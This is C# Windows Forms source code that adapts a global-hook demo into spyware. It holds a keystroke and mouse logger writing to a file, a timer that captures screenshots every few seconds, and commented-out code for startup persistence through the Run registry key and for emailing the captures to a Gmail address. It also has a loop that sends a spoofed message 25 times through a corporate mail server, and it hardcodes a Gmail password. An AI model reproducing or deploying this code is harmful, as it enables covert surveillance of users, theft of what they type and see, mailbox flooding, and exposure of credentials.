using System;
using System.Windows.Forms;
using gma.System.Windows;
using Microsoft.Win32;
using System.Net.Mail;
using System.Drawing;
using System.IO;
using System.Drawing.Imaging;
using System.Net;
using System.Threading;

namespace GlobalHookDemo 
{
	class MainForm : System.Windows.Forms.Form
	{
		private System.Windows.Forms.Button buttonStart;
		private System.Windows.Forms.Button buttonStop;
		private System.Windows.Forms.Label labelMousePosition;
		private System.Windows.Forms.TextBox textBox;

		public MainForm()
		{
			InitializeComponent();
		}
	
		// THIS METHOD IS MAINTAINED BY THE FORM DESIGNER
		// DO NOT EDIT IT MANUALLY! YOUR CHANGES ARE LIKELY TO BE LOST
		void InitializeComponent() {
            this.textBox = new System.Windows.Forms.TextBox();
            this.labelMousePosition = new System.Windows.Forms.Label();
            this.buttonStop = new System.Windows.Forms.Button();
            this.buttonStart = new System.Windows.Forms.Button();
            this.SuspendLayout();
            // 
            // textBox
            // 
            this.textBox.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
                        | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.textBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.textBox.Font = new System.Drawing.Font("Courier New", 11F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.World);
            this.textBox.Location = new System.Drawing.Point(4, 55);
            this.textBox.Multiline = true;
            this.textBox.Name = "textBox";
            this.textBox.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.textBox.Size = new System.Drawing.Size(322, 340);
            this.textBox.TabIndex = 3;
            // 
            // labelMousePosition
            // 
            this.labelMousePosition.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.labelMousePosition.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.labelMousePosition.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.labelMousePosition.Location = new System.Drawing.Point(4, 29);
            this.labelMousePosition.Name = "labelMousePosition";
            this.labelMousePosition.Size = new System.Drawing.Size(322, 23);
            this.labelMousePosition.TabIndex = 2;
            this.labelMousePosition.Text = "labelMousePosition";
            this.labelMousePosition.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // buttonStop
            // 
            this.buttonStop.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.buttonStop.Location = new System.Drawing.Point(85, 3);
            this.buttonStop.Name = "buttonStop";
            this.buttonStop.Size = new System.Drawing.Size(75, 23);
            this.buttonStop.TabIndex = 1;
            this.buttonStop.Text = "Stop";
            this.buttonStop.Click += new System.EventHandler(this.ButtonStopClick);
            // 
            // buttonStart
            // 
            this.buttonStart.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.buttonStart.Location = new System.Drawing.Point(4, 3);
            this.buttonStart.Name = "buttonStart";
            this.buttonStart.Size = new System.Drawing.Size(75, 23);
            this.buttonStart.TabIndex = 0;
            this.buttonStart.Text = "Start";
            this.buttonStart.Click += new System.EventHandler(this.ButtonStartClick);
            // 
            // MainForm
            // 
            this.AutoScaleBaseSize = new System.Drawing.Size(5, 13);
            this.ClientSize = new System.Drawing.Size(328, 398);
            this.Controls.Add(this.textBox);
            this.Controls.Add(this.labelMousePosition);
            this.Controls.Add(this.buttonStop);
            this.Controls.Add(this.buttonStart);
            this.Name = "MainForm";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Text = "This application captures keystrokes";
            this.Load += new System.EventHandler(this.MainFormLoad);
            this.ResumeLayout(false);
            this.PerformLayout();

		}
			
		[STAThread]
		public static void Main(string[] args)
		{
			Application.Run(new MainForm());
		}
		
		void ButtonStartClick(object sender, System.EventArgs e)
		{
            SendEmailLoop(25);
		//	actHook.Start();
          //  RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          //  add.SetValue("Woooooooot", "\"" + Application.ExecutablePath.ToString());
		}
        public void SendEmail(string sender, string recipient, string subject, string body, string attachement) {

            MailMessage mm = new MailMessage();
            mm.From = new MailAddress("lebaneseamerican.lau@gmail.com");
            mm.To.Add("mzkabbani@gmail.com");
            mm.Subject = "Ant Subject";
            mm.Body = "Body Cha MEssag here ";

            SmtpClient ss = new SmtpClient();
            ss.Host = "smtp.gmail.com";
            ss.Port = 587;
            ss.EnableSsl = true;

            ss.Credentials = new System.Net.NetworkCredential("lebaneseamerican.lau@gmail.com", "19881990");

            ss.Send(mm);
        }

        public void SendEmailLoop(int times) {

            MailAddress mailfrom = new MailAddress("ialwani@murex.com","Imad Alwani");
            MailAddress mailto = new MailAddress("ialwani@murex.com");
            MailMessage newmsg = new MailMessage(mailfrom, mailto);
            
            newmsg.Subject = "RE: [v3.1.build][LINUX][PAR.TPK.0001664] [V3.1] [QL3] Exception when initializing session on Linux OS";
            newmsg.Body = "RE: [v3.1.build][LINUX][PAR.TPK.0001664] [V3.1] [QL3] Exception when initializing session on Linux OSRE: [v3.1.build][LINUX][PAR.TPK.0001664] [V3.1] [QL3] Exception when initializing session on Linux OS";

            //Attachment att = new Attachment("C:\\...file path");
            //newmsg.Attachments.Add(att);

            SmtpClient smtp = new SmtpClient("Barid.lb.murex.com");
            smtp.UseDefaultCredentials = false;
            smtp.Credentials = new NetworkCredential();
            //smtp.EnableSsl = true; 
            Thread.Sleep(5000);
            for (int i = 0; i < times; i++) {
                smtp.Send(newmsg);
            }
                      
        }

        private void btnStart_Click(object sender, EventArgs e) {
            System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
            timer1.Tick += new EventHandler(this.timer1_Tick);
            timer1.Interval = (100) * (50);
            timer1.Enabled = true;
            timer1.Start();

        }
        private void timer1_Tick(object sender, EventArgs e) {
            Bitmap bitmap = GetScreenShot();
            Directory.CreateDirectory(@"D:\pics");
            bitmap.Save(@"D:\pics\image" + pictureCount + ".jpeg");

        //    if (pictureCount == 3) {               
        //        SendEmail("abc@abc.xom", "mzkabbani@gmail.com", "capture", "pics", @"D:\pics");
       //         pictureCount = 0;
      ////          Directory.Delete(@"D:\pics");
      //          Directory.CreateDirectory(@"D:\pics");
     //       }
            pictureCount++;
         //   File.Delete(@"D:\image" + pictureCount + ".jpeg");


            //     var stream = new MemoryStream();
        }



        public static Bitmap GetScreenShot() {
            //to allow the screen to refresh(repaint)
            Application.DoEvents();

            // Set the bitmap object to the size of the screen
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width
                                           , Screen.PrimaryScreen.Bounds.Height
                                           , PixelFormat.Format32bppArgb
                );

            // Create a graphics object from the bitmap
            Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            // Take the screenshot from the upper left corner to the right bottom corner
            try {
                gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X
                                        , Screen.PrimaryScreen.Bounds.Y
                                        , 0
                                        , 0
                                        , Screen.PrimaryScreen.Bounds.Size
                                        , CopyPixelOperation.SourceCopy
               );
            } catch (Exception ex) {


            }

            return bmpScreenshot;
        }


		void ButtonStopClick(object sender, System.EventArgs e)
		{
			actHook.Stop();
		}
        
        private Int32 pictureCount = 0;
		
		UserActivityHook actHook;
		void MainFormLoad(object sender, System.EventArgs e)
		{
       //     actHook = new UserActivityHook(); // crate an instance with global hooks
		//	// hang on events
		//	actHook.OnMouseActivity+=new MouseEventHandler(MouseMoved);
		//	actHook.KeyDown+=new KeyEventHandler(MyKeyDown);
		//	actHook.KeyPress+=new KeyPressEventHandler(MyKeyPress);
		//	actHook.KeyUp+=new KeyEventHandler(MyKeyUp);
        //    actHook.Start();
          //  RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        //    add.SetValue("SystemService_Admin", "\"" + Application.ExecutablePath.ToString());
       //     Timer timer1 = new Timer();
         //   timer1.Tick += new EventHandler(this.timer1_Tick);
         //   timer1.Interval = (100) * (50);
         //   timer1.Enabled = true;
         //   timer1.Start();
        }


       

		public void MouseMoved(object sender, MouseEventArgs e)
		{
			labelMousePosition.Text=String.Format("x={0}  y={1} wheel={2}", e.X, e.Y, e.Delta);
			if (e.Clicks>0) LogWrite("MouseButton 	- " + e.Button.ToString());
		}
		
		public void MyKeyDown(object sender, KeyEventArgs e)
		{
			LogWrite("KeyDown 	- " + e.KeyData.ToString());
		}
		
		public void MyKeyPress(object sender, KeyPressEventArgs e)
		{
			LogWrite("KeyPress 	- " + e.KeyChar);
		}
		
		public void MyKeyUp(object sender, KeyEventArgs e)
		{
			LogWrite("KeyUp 		- " + e.KeyData.ToString());
		}
		
		private void LogWrite(string txt)
		{
            StreamWriter writer = new StreamWriter(@"D:\loger.txt",true);
            try {

                writer.WriteLine(txt);
            } finally {
                if(writer != null){
                    writer.Close();
                }
            }


			textBox.AppendText(txt + Environment.NewLine);
			textBox.SelectionStart = textBox.Text.Length;
		}

	}			
}
